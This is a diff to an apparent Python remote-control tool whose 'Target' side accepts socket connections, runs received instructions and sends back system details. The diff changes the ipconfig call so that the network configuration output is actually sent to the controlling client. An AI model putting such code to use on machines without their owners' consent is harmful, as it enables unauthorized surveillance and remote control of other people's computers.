@@ -3,6 +3,7 @@ import os
 import subprocess
 import platform
 
+
 class Machine:
     def __init__(self):
         # create socket
@@ -48,9 +49,9 @@ class Client(Machine):
         self.s.send(str.encode(str(info)))
         info = self.s.recv(2048)
         print(info.decode("utf-8"))
-        info = self.s.recv(8192*2)
+        info = self.s.recv(4096)
         print(info.decode("utf-8"))
-        input("\n\n Press ENTER")
+        input("\n\nPress ENTER")
 
 
 # Target is the server
@@ -79,7 +80,6 @@ class Target(Machine):
         self.s, self.information = self.s.accept()
         print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " + str(self.information[1]))
 
-
     def what_to_do(self):
         while True:
             instruction = self.s.recv(2048)
@@ -98,7 +98,7 @@ class Target(Machine):
         while True:
             data = self.s.recv(4096)
             if data.decode("utf-8") == "quit":
-                self.s.send(str.encode("we are leaving"))
+                self.s.send(str.encode("we are leaving \n"))
                 break
             else:
                 try:
@@ -127,9 +127,12 @@ class Target(Machine):
                                + "\nProcessor: " + platform.uname()[5]))
 
     def getinfo_target_network(self):
-        # cmd = str(os.system("ipconfig"))
+        cmd = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = output_bytes.decode("utf-8", errors='replace')
         self.s.send(str.encode("Configuration IP: "))
-        self.s.send(str.encode(str(os.system("ipconfig"))))
+        self.s.send(str.encode(output_str))
 
     # close de connection and the socket
     def quit(self):
